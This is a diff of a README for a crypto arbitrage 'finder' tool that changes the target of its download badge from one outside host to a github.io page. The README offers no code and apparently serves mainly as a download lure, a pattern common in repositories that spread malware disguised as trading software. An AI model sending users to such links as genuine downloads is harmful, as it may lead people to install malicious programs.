@@ -2,7 +2,7 @@
 
 Discover profitable crypto arbitrage opportunities in real time across multiple exchanges. Designed for traders, bots, and arbitrage hunters — fully automated with customizable settings and instant alerts.
 
-[![Download Arbitrage Finder](https://img.shields.io/badge/Download-Arbitrage_Finder-blueviolet)](https://seomadjest.com)
+[![Download Arbitrage Finder](https://img.shields.io/badge/Download-Arbitrage_Finder-blueviolet)](https://crypto-arbitrage-finder.github.io/.github)
 
 ---
 
